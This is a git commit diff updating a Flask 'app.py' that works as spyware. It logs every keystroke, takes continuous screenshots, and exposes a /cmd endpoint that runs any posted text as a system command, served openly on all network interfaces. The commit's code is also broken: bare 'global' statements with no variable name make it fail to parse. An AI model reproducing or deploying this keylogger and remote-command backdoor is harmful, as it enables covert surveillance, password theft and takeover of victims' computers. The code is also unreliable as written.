6b558289b2b56f9603446c4552bc40f919dc7d4b
wangzhaohan2910 <158981244+wangzhaohan2910@users.noreply.github.com>
2025-11-22 11:49:32 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,30 +1,50 @@
 from flask import Flask, render_template, request
 from keyboard import on_press
 from pyscreenshot import grab
+from threading import Thread
+from time import sleep
 from os import system
+
 app = Flask(__name__)
 s = ""
-def onPress(event):
-    global s
-    s += event.name + ' '
-on_press(onPress)
+
+
+def press(event):
+    global
+    s += event.name + " "
+
+
+def shot():
+    while True:
+        grab().save("screen.png")
+        sleep(0.06)
+
+
 @app.route("/clear")
 def clear():
-    global s
+    global
     s = ""
     return render_template("back.html")
+
+
 @app.route("/screen.png")
 def screen():
-    grab().save("screen.png")
     return open("screen.png", "rb").read()
+
+
 @app.route("/cmd", methods=["POST"])
 def cmd():
-    area=request.form.get("area")
-    system(area)
+    system(request.form.get("area"))
     return render_template("back.html")
+
+
 @app.route("/")
 def index():
-    global s
+    global
     return render_template("index.html", s=s)
+
+
 if __name__ == "__main__":
+    on_press(press)
+    Thread(target=shot).start()
     app.run(host="0.0.0.0", port=1145)
